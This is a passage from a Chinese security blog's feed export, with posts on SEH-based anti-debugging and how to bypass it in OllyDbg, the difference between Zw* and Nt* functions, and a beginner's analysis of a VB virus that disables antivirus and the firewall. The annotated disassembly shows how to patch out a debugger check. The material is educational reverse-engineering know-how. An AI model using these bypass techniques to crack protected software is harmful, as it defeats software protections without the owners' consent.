alt=""></p><p><strong>2.异常处理函数：异常处理函数是一个回调函数，接收4个参数，返回值是一个枚举类型。</strong><br>    <img src="https://i.imgur.com/lF0vRfL.png" alt=""></p><ul><li>四个参数：<ul><li>1）Exception_Recode *pRecode:该参数是一个指向_Exception_Recode结构体的指针。该结构体包含关于异常的类型和地址等重要信息。<br><img src="https://i.imgur.com/vJdqVsF.png" alt=""></li><li>2）Exception_Register_Recode *pFrame:不重要</li><li>3）CONTEXT *pContext:对于IA-32 来说有效，保存CPU处理异常前的状态。</li><li>4）PVOID *pViod:保留应该为1<br><img src="https://i.imgur.com/1y36Gh1.png" alt=""></li></ul></li><li>1个返回值：处理成功返回0，否则返回1</li></ul><p><strong>3.SEH的入口地址：在TEB.NtTib.ExceptionList,对应的段寄存器地址是FS:[0].</strong></p><h1 id="第三部分：SEH反调试基础："><a href="#第三部分：SEH反调试基础：" class="headerlink" title="第三部分：SEH反调试基础："></a>第三部分：SEH反调试基础：</h1><p><strong>1.首先利用异常处理例程来进行反跟踪</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;很多CM都是首先安装好一个异常处理例程，<strong>然后故意制造一个异常</strong>,然后程序抛出异常.ollydebug下用shift + F7 或者 shift + F8进ntdll.KiUserExceptionDispatcher,单步跟踪后最后系统调用用户模块中的异常处理例程. 很多CM都是在异常处理例程编写一个算法来重新将EIP定位到一个会造成异常的指令地址，重复这个过程几次，这样给调试者一种很难跟踪的假象，这种一般只要用 shift + F9 (OllyDebug:该组合键是将异常交给用户程序的异常处理例程来处理),如果我们想弄清楚异常处理例程到底在做什么，我们可以在异常处理例程下个断点来查看其实现过程。<br>    <img src="https://i.imgur.com/H9gbcVy.png" alt=""><br>    <img src="https://i.imgur.com/DiXU43I.png" alt=""></p><p><strong>2.未处理异常用于反跟踪的原理:</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;根据MSDN的描述,UnhandledExceptionFilter在没有debugger attach的时候才会被调用。所以，SetUnhandledExceptionFilter函数还有一个妙用，就是让某些敏感代码避开debugger的追踪。比如你想把一些代码保护起来，避免调试器的追踪，可以采用的方法：<strong>把代码放到SetUnhandledExceptionFilter设定的函数里面。通过人为触发一个unhandled exception来执行。<font color="#DC143C">由于设定的UnhandledExceptionFilter函数只有在调试器没有加载的时候才会被系统调用，这里巧妙地使用了系统的这个功能来保护代码.</font></strong></p><h1 id="第四部分：绕过SEH反调试："><a href="#第四部分：绕过SEH反调试：" class="headerlink" title="第四部分：绕过SEH反调试："></a>第四部分：绕过SEH反调试：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于第一种，只需要在IsPresnetDebug()返回时修改判断即可。或者直接修改FS:[18]中的debuged成员为“0”。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于第二种，因为UnhandledExceptionFilter是否调用取决于系统内核的判断。用户态的调试器要想改变这个行为，要破费一番脑筋了。</p><pre><code>2018年1月25日夜于汉阴</code></pre><h1 id="第五部分：利用SEH保护验证码"><a href="#第五部分：利用SEH保护验证码" class="headerlink" title="第五部分：利用SEH保护验证码"></a>第五部分：利用SEH保护验证码</h1><p>1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先，我们看到这个一个MSAM汇编编译而成的程序，如图所示，程序对输入的用户名长度做出验证，正确长度是4-30个字节，<br>    <img src="https://i.imgur.com/zt2j9iL.png" alt=""><br>2.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果正确，则跳入SEH安装程序，输入注册码。输入完毕后，给出一个int 3软件异常，跳入SEH处理函数。<br>    <img src="https://i.imgur.com/8GlJtRr.png" alt=""><br>3.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个SEH处理函数，是一个验证注册码正确的的函数，关于验证过程，本文不做介绍。<br>    <img src="https://i.imgur.com/EPMGJsa.png" alt=""><br>4.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;快速到达SEH处理函数的方法，如图所是，栈顶是下一个处理函数的指针，下面红圈所是个这次处理函数的指针。<br>    <img src="https://i.imgur.com/wuFfm7I.png" alt=""><br>5.备注，测试用例：<br>    <a href="https://pan.baidu.com/s/1htLY6ag" title="测试用例" target="_blank" rel="external">https://pan.baidu.com/s/1htLY6ag</a></p><h1 id="第六部分：利用SetUnhandledExceptionFilter和UnhandledExceptionFileter函数实现反调试"><a href="#第六部分：利用SetUnhandledExceptionFilter和UnhandledExceptionFileter函数实现反调试" class="headerlink" title="第六部分：利用SetUnhandledExceptionFilter和UnhandledExceptionFileter函数实现反调试"></a>第六部分：利用SetUnhandledExceptionFilter和UnhandledExceptionFileter函数实现反调试</h1><p>1.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;异常时，系统处理异常的顺序</p><ul><li>发生异常时系统的处理顺序(by Jeremy Gordon, Hume): <ul><li>1.系统首先判断异常是否应发送给目标程序的异常处理例程,如果决定应该发送,并且目标程序正在被调试,则系统 挂起程序并向调试器发送EXCEPTION_DEBUG_EVENT消息.</li><li>2.如果你的程序没有被调试或者调试器未能处理异常,系统就会继续查找你是否安装了线程相关的异常处理例程,如果 你安装了线程相关的异常处理例程,系统就把异常发送给你的程序seh处理例程,交由其处理. </li><li>3.每个线程相关的异常处理例程可以处理或者不处理这个异常,如果他不处理并且安装了多个线程相关的异常处理例程, 可交由链起来的其他例程处理. </li><li>4.如果这些例程均选择不处理异常,如果程序处于被调试状态,操作系统仍会再次挂起程序通知debugger. </li><li>5.如果程序未处于被调试状态或者debugger没有能够处理,并且你调用SetUnhandledExceptionFilter安装了最后异 常处理例程的话,系统转向对它的调用. </li><li>6.如果你没有安装最后异常处理例程或者他没有处理这个异常,系统会调用默认的系统处理程序,通常显示一个对话框, 你可以选择关闭或者最后将其附加到调试器上的调试按钮.如果没有调试器能被附加于其上或者调试器也处理不了,系统 就调用ExitProcess终结程序. </li><li>7.不过在终结之前,系统仍然对发生异常的线程异常处理句柄来一次展开,这是线程异常处理例程最后清理的机会.</li></ul></li></ul><p>2.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;本例样本网络上找不到了，截取前辈的数据。<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div></pre></td><td class="code"><pre><div class="line">77C01269 &gt;  <span class="number">55</span>              <span class="keyword">push</span> <span class="built_in">ebp</span>////以下用F8走。</div><div class="line">77C0126A    8BEC            <span class="keyword">mov</span> <span class="built_in">ebp</span>,<span class="built_in">esp</span></div><div class="line"> 77C0126C    <span class="number">51</span>              <span class="keyword">push</span> <span class="built_in">ecx</span></div><div class="line"> 77C0126D    <span class="number">53</span>              <span class="keyword">push</span> <span class="built_in">ebx</span></div><div class="line"> 77C0126E    <span class="number">56</span>              <span class="keyword">push</span> <span class="built_in">esi</span></div><div class="line"> 77C0126F    <span class="number">57</span>              <span class="keyword">push</span> <span class="built_in">edi</span></div><div class="line"> 77C01270    E8 DD680000     <span class="keyword">call</span> 77C07B52                          <span class="comment">; 77C07B52</span></div><div class="line"> 77C01275    8B7D <span class="number">08</span>         <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">8</span>]</div><div class="line"> 77C01278    8BF0            <span class="keyword">mov</span> <span class="built_in">esi</span>,<span class="built_in">eax</span></div><div class="line"> 77C0127A    8B56 <span class="number">54</span>         <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>+<span class="number">54</span>]</div><div class="line"> 77C0127D    A1 94A7C277     <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[77C2A794]</div><div class="line"> 77C01282    8BCA            <span class="keyword">mov</span> <span class="built_in">ecx</span>,<span class="built_in">edx</span></div><div class="line"> 77C01284    <span class="number">3939</span>            <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>],<span class="built_in">edi</span></div><div class="line"> 77C01286    <span class="number">74</span> <span class="number">0D</span>           <span class="keyword">je</span> short 77C01295                      <span class="comment">; 77C01295</span></div><div class="line"> 77C01288    8D1C40          <span class="keyword">lea</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="built_in">eax</span>*<span class="number">2</span>]</div><div class="line"> 77C0128B    83C1 0C         <span class="keyword">add</span> <span class="built_in">ecx</span>,0C</div><div class="line"> 77C0128E    8D1C9A          <span class="keyword">lea</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="built_in">ebx</span>*<span class="number">4</span>]</div><div class="line"> 77C01291    3BCB            <span class="keyword">cmp</span> <span class="built_in">ecx</span>,<span class="built_in">ebx</span></div><div class="line"> 77C01293  ^ <span class="number">72</span> EF           <span class="keyword">jb</span> short 77C01284                      <span class="comment">; 77C01284</span></div><div class="line"> 77C01295    8D0440          <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="built_in">eax</span>*<span class="number">2</span>]////F4下来。</div><div class="line">77C01298    8D0482          <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>+<span class="built_in">eax</span>*<span class="number">4</span>]</div><div class="line"> 77C0129B    3BC8            <span class="keyword">cmp</span> <span class="built_in">ecx</span>,<span class="built_in">eax</span></div><div class="line"> 77C0129D    <span class="number">73</span> <span class="number">04</span>           <span class="keyword">jnb</span> short 77C012A3                     <span class="comment">; 77C012A3</span></div><div class="line"> 77C0129F    <span class="number">3939</span>            <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>],<span class="built_in">edi</span></div><div class="line"> 77C012A1    <span class="number">74</span> <span class="number">02</span>           <span class="keyword">je</span> short 77C012A5                      <span class="comment">; 77C012A5</span></div><div class="line"> 77C012A3    33C9            <span class="keyword">xor</span> <span class="built_in">ecx</span>,<span class="built_in">ecx</span></div><div class="line"> 77C012A5    85C9            <span class="keyword">test</span> <span class="built_in">ecx</span>,<span class="built_in">ecx</span></div><div class="line"> 77C012A7    0F84 <span class="number">12010000</span>   <span class="keyword">je</span> 77C013BF ////这里跳！</div><div class="line">77C012AD    8B59 <span class="number">08</span>         <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">8</span>]</div><div class="line"> 77C012B0    85<span class="built_in">DB</span>            <span class="keyword">test</span> <span class="built_in">ebx</span>,<span class="built_in">ebx</span></div><div class="line"> 77C012B2    <span class="number">895D</span> <span class="number">08</span>         <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">8</span>],<span class="built_in">ebx</span></div><div class="line"> 77C012B5    0F84 <span class="number">04010000</span>   <span class="keyword">je</span> 77C013BF                            <span class="comment">; 77C013BF</span></div><div class="line"> 77C012BB    83FB <span class="number">05</span>         <span class="keyword">cmp</span> <span class="built_in">ebx</span>,<span class="number">5</span></div><div class="line"> 77C012BE    <span class="number">75</span> 0C           <span class="keyword">jnz</span> short 77C012CC                     <span class="comment">; 77C012CC</span></div></pre></td></tr></table></figure></p><p>跳到:<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">77C013BF    FF75 0C         <span class="keyword">push</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+C]////跳到这里。</div><div class="line">77C013C2    FF15 C011BE77   <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[77BE11C0] <span class="comment">; kernel32.UnhandledExceptionFilter</span></div><div class="line"> 77C013C8    5F              <span class="keyword">pop</span> <span class="built_in">edi</span></div><div class="line"> 77C013C9    5E              <span class="keyword">pop</span> <span class="built_in">esi</span></div><div class="line"> 77C013CA    5B              <span class="keyword">pop</span> <span class="built_in">ebx</span></div><div class="line"> 77C013CB    C9              <span class="keyword">leave</span></div><div class="line"> 77C013CC    C3              <span class="keyword">retn</span></div></pre></td></tr></table></figure></p><p>跳到77C013BF后就可以发现开始调用UnhandledExceptionFilter了!!!<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line"> 77E730C0 &gt;  <span class="number">68</span> <span class="number">00050000</span>      <span class="keyword">push</span> <span class="number">500</span></div><div class="line"> 77E730C5    <span class="number">68</span> F852E777     <span class="keyword">push</span> 77E752F8</div><div class="line"> 77E730CA    E8 0972FEFF     <span class="keyword">call</span> 77E5A2D8                          <span class="comment">; 77E5A2D8</span></div><div class="line"> 77E730CF    C745 E4 <span class="number">0400000</span>&gt;<span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-1C],<span class="number">4</span></div><div class="line"> 77E730D6    8B7D <span class="number">08</span>         <span class="keyword">mov</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">8</span>]</div><div class="line"> 77E730D9    8B07            <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edi</span>]</div><div class="line"> 77E730DB    BB 050000C0     <span class="keyword">mov</span> <span class="built_in">ebx</span>,C0000005</div><div class="line"> 77E730E0    33F6            <span class="keyword">xor</span> <span class="built_in">esi</span>,<span class="built_in">esi</span></div><div class="line"> 77E730E2    <span class="number">3918</span>            <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>],<span class="built_in">ebx</span></div><div class="line"> 77E730E4    <span class="number">75</span> <span class="number">09</span>           <span class="keyword">jnz</span> short 77E730EF                     <span class="comment">; 77E730EF</span></div><div class="line"> 77E730E6    <span class="number">3970</span> <span class="number">14</span>         <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">14</span>],<span class="built_in">esi</span></div><div class="line"> 77E730E9    0F85 77DC0000   <span class="keyword">jnz</span> 77E80D66                           <span class="comment">; 77E80D66</span></div><div class="line"> 77E730EF    <span class="number">8975</span> E0         <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">20</span>],<span class="built_in">esi</span></div><div class="line"> 77E730F2    <span class="number">56</span>              <span class="keyword">push</span> <span class="built_in">esi</span></div><div class="line"> 77E730F3    6A <span class="number">04</span>           <span class="keyword">push</span> <span class="number">4</span></div><div class="line"> 77E730F5    8D45 E0         <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">20</span>]</div><div class="line"> 77E730F8    <span class="number">50</span>              <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line"> 77E730F9    6A <span class="number">07</span>           <span class="keyword">push</span> <span class="number">7</span></div><div class="line"> 77E730FB    E8 B9B5FEFF     <span class="keyword">call</span> 77E5E6B9////调用GetCurrentProcess，返回hProcess。</div><div class="line">77E73100    <span class="number">50</span>              <span class="keyword">push</span> <span class="built_in">eax</span></div><div class="line"> 77E73101    FF15 AC10E477   <span class="keyword">call</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[77E410AC]////调用ntdll.ZwQueryInformationProcess。晕，调用好多次!</div><div class="line">77E73107    85C0            <span class="keyword">test</span> <span class="built_in">eax</span>,<span class="built_in">eax</span>////<span class="built_in">EAX</span>=<span class="number">0</span>则表示成功，否则失败。</div><div class="line">77E73109    7C <span class="number">09</span>           <span class="keyword">jl</span> short 77E73114</div><div class="line"> 77E7310B    <span class="number">3975</span> E0         <span class="keyword">cmp</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">20</span>],<span class="built_in">esi</span>////[<span class="built_in">ebp</span>-<span class="number">20</span>]=－<span class="number">1</span>，则表示有调试器，=<span class="number">0</span>表示没调试器。</div><div class="line">77E7310E    0F85 C5060000   <span class="keyword">jnz</span> 77E737D9////这里不能跳，跳则表示有调试器。干脆<span class="keyword">NOP</span>掉!</div><div class="line">77E73114    A1 B473EB77     <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[77EB73B4]</div><div class="line"> 77E73119    3BC6            <span class="keyword">cmp</span> <span class="built_in">eax</span>,<span class="built_in">esi</span></div><div class="line"> 77E7311B    <span class="number">74</span> <span class="number">15</span>           <span class="keyword">je</span> short 77E73132</div><div class="line"> 77E7311D    <span class="number">57</span>              <span class="keyword">push</span> <span class="built_in">edi</span></div><div class="line"> 77E7311E    FFD0            <span class="keyword">call</span> <span class="built_in">eax</span>////F7进入!</div><div class="line">77E73120    83F8 <span class="number">01</span>         <span class="keyword">cmp</span> <span class="built_in">eax</span>,<span class="number">1</span></div><div class="line"> 77E73123    0F84 E9030000   <span class="keyword">je</span> 77E73512                            <span class="comment">; 77E73512</span></div></pre></td></tr></table></figure></p><p>3.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong><font color="#DC143C">总结：在第四部分中我说了，对于第二种方法，属于内核级调试，不容易绕过，但是这个例子给了我们一个思路:由于反调试代码UnhandledExceptionFilter函数内部，我们可以跟进函数内部，把里面的判断给误导了，就可以顺利通过反调试。</font></strong></p><pre><code>2018年1月26日夜于汉阴</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;strong&gt;SEH(“Structured Exception Handling”),即结构化异常处理·是(windows)操作系统提供给程序设计者的强有力的处理程序错误或异常的武器。它不依托于设计语言，只依托于操作系统，这些并不是编译程序本身所固有的,本质上只不过是对windows内在提供的结构化异常处理的包装。&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;参看资料：&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;1.逆向工程核心原理&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;2.&lt;a href=&quot;https://www.52pojie.cn/thread-16609-1-1.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.52pojie.cn/thread-16609-1-1.html&lt;/a&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;3.&lt;a href=&quot;https://bbs.pediy.com/thread-27224.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://bbs.pediy.com/thread-27224.html&lt;/a&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;4.&lt;a href=&quot;https://bbs.pediy.com/thread-12449.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://bbs.pediy.com/thread-12449.htm&lt;/a&gt;&lt;/strong&gt;&lt;br&gt;&lt;strong&gt;5.&lt;a href=&quot;https://bbs.pediy.com/thread-189193.htm&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://bbs.pediy.com/thread-189193.htm&lt;/a&gt;&lt;/strong&gt;&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Zw*与Nt*的区别</title>
    <link href="http://yoursite.com/2018/01/23/%E5%86%85%E6%A0%B8Nt%E5%92%8CZw%E5%87%BD%E6%95%B0%E5%8C%BA%E5%88%AB/"/>
    <id>http://yoursite.com/2018/01/23/内核Nt和Zw函数区别/</id>
    <published>2018-01-23T07:02:11.000Z</published>
    <updated>2018-01-23T11:01:19.366Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-在用户态"><a href="#1-在用户态" class="headerlink" title="1:在用户态"></a>1:在用户态</h1><p>1：以ReadFile为例：ntdll.dll导出了ZwReadFile和NtReadFile </p><p><strong>2.不管你调用ZwReadFile还是NtReadFile都是一样的</strong></p><p>3.因为他们是同一个函数的两个不同名称而已…. 而且他们最终都会调用到ntoskrnl中的NtReadFile中去。<br><a id="more"></a></p><h1 id="2-在内核态"><a href="#2-在内核态" class="headerlink" title="2:在内核态"></a>2:在内核态</h1><p>1：ntoskrnl.exe导出了ZwReadFile和NtReadFile<br><strong>2：Ntoskrnl导出的NtReadFile是真正的执行函数，ZwReadFile是一个stub函数</strong><br>3：区别：<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;内核态调用ZwReadFile，会将Previous Mode设置为Kernel Mode，然后再调用NtReadFile。而在内核态直接调用NtReadFile，不会改变Previous Mode。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NtReadFile中会检测当前调用来自用户态还是内核态。如果是来自内核态，不会检测参数；而如果是来自用户态，就会做一系列的参数检测。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;我们知道，内核组件可能运行在任意进程的上下文中，当它调用NtReadFile时，因为Previous Mode很可能是User Mode，而我们的参数请求的内核态的地址，这时通常就会产 STATUS_ACCESS_VIOLATION 错误 。</p><p><strong>所以内核态一般用Zw*系列的函数</strong></p><p><a href="http://www.osronline.com/article.cfm?id=257" title="关于Nt*与Zw*的更为详细的介绍" target="_blank" rel="external">http://www.osronline.com/article.cfm?id=257</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-在用户态&quot;&gt;&lt;a href=&quot;#1-在用户态&quot; class=&quot;headerlink&quot; title=&quot;1:在用户态&quot;&gt;&lt;/a&gt;1:在用户态&lt;/h1&gt;&lt;p&gt;1：以ReadFile为例：ntdll.dll导出了ZwReadFile和NtReadFile &lt;/p&gt;
&lt;p&gt;&lt;strong&gt;2.不管你调用ZwReadFile还是NtReadFile都是一样的&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;3.因为他们是同一个函数的两个不同名称而已…. 而且他们最终都会调用到ntoskrnl中的NtReadFile中去。&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>病毒分析技术（1)</title>
    <link href="http://yoursite.com/2018/01/12/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF(1)/"/>
    <id>http://yoursite.com/2018/01/12/病毒分析技术(1)/</id>
    <published>2018-01-12T07:02:11.000Z</published>
    <updated>2018-01-12T15:11:14.587Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;越到考试我越浪，今天就正式更新第一篇关于病毒分析技术的文章，第一次分析，关于病毒的了解不够深入。有些分析不到位，尽请谅解。病毒样本来自卡饭社区。<br><a id="more"></a></p><h1 id="病毒行为分析："><a href="#病毒行为分析：" class="headerlink" title="病毒行为分析："></a>病毒行为分析：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;首先是对病毒的行为分析，分析过程在win7的虚拟机下进行。打开火绒剑，开启行为监测。运行病毒程序，发现样本的特殊行为如下</p><ul><li>1）在系统Temp目录创建文件，达到隐藏自身的目的：<br>  <img src="https://i.imgur.com/QdsGxRf.png" alt=""></li><li>2）执行创建的文件，病毒开始发挥作用。<br>  <img src="https://i.imgur.com/V7bWqUA.png" alt=""></li><li>3）打开explorer，目标路径是我的文档，显示文件无法访问，可能是病毒把代码注入explorer文件，并且启动进程。第二点：调用cmd，以进行下一步操作，同时达到隐藏自身的作用。<br>  <img src="https://i.imgur.com/X6xNFSH.png" alt=""><br>  <img src="https://i.imgur.com/KBe5Lhs.png" alt=""></li></ul><h1 id="病毒静态分析："><a href="#病毒静态分析：" class="headerlink" title="病毒静态分析："></a>病毒静态分析：</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;查壳，没有加壳。发现使用VB写的老病毒了，上神器VB_Decompiler。</p><ul><li>0）检测杀毒软件，通过检测进程名称识别，然后调用cmd命令关闭防护进程。<br>  <img src="https://i.imgur.com/X4W9SER.png" alt=""></li><li>1）此处利用shell函数，以脚本的形式调用资源管理器。<br>  <img src="https://i.imgur.com/utdS11I.png" alt=""></li><li>2）在前一个时间检测本地系统环境，获取时间，精确到毫秒级。修改注册表项，实现病毒的自启动。<br>  <img src="https://i.imgur.com/SGsy7Wf.png" alt=""></li><li>3）检测本地的用户是否是管理员，然后检测防火墙的状态，如果防火墙处于打开状态，关闭它，然后下载FTP服务器下的内容。<ul><li>3.1）通过写入注册表项，关闭防火墙!<br><img src="https://i.imgur.com/w0Rs61K.png" alt=""></li><li>3.2)远程从FTP服务器中下载指定的内容<br><img src="https://i.imgur.com/bsFXWwO.png" alt=""></li></ul></li><li>4）黑客远程FTP服务器地址如下：此时已经无法访问这个FTP了。<br>  <img src="https://i.imgur.com/PAGfm2J.png" alt=""></li><li>5）网上爬取xml框架内容，构建一个全新的xml框架【猜测】<br>  <img src="https://i.imgur.com/WAGvzIb.png" alt=""></li><li>6）设置特殊文件的属性，目标文件是winservice和winsystem</li></ul><h1 id="专业分析系统的分析："><a href="#专业分析系统的分析：" class="headerlink" title="专业分析系统的分析："></a>专业分析系统的分析：</h1><p> <a href="https://habo.qq.com/file/showdetail?md5=bf5366660d7629f1fdf5b94921c824e6&amp;pk=ADMGYl1lB2EIMFs8" target="_blank" rel="external">https://habo.qq.com/file/showdetail?md5=bf5366660d7629f1fdf5b94921c824e6&amp;pk=ADMGYl1lB2EIMFs8</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;越到考试我越浪，今天就正式更新第一篇关于病毒分析技术的文章，第一次分析，关于病毒的了解不够深入。有些分析不到位，尽请谅解。病毒样本来自卡饭社区。&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>浅谈Base64的加密原理及其应用</title>
    <link href="http://yoursite.com/2017/12/24/%E6%B5%85%E8%B0%88Base64%E7%9A%84%E5%8A%A0%E5%AF%86%E4%B8%8E%E8%A7%A3%E5%AF%86/"/>
    <id>http://yoursite.com/2017/12/24/浅谈Base64的加密与解密/</id>
    <published>2017-12-24T06:02:11.000Z</published>
    <updated>2017-12-24T07:57:36.181Z</updated>
    
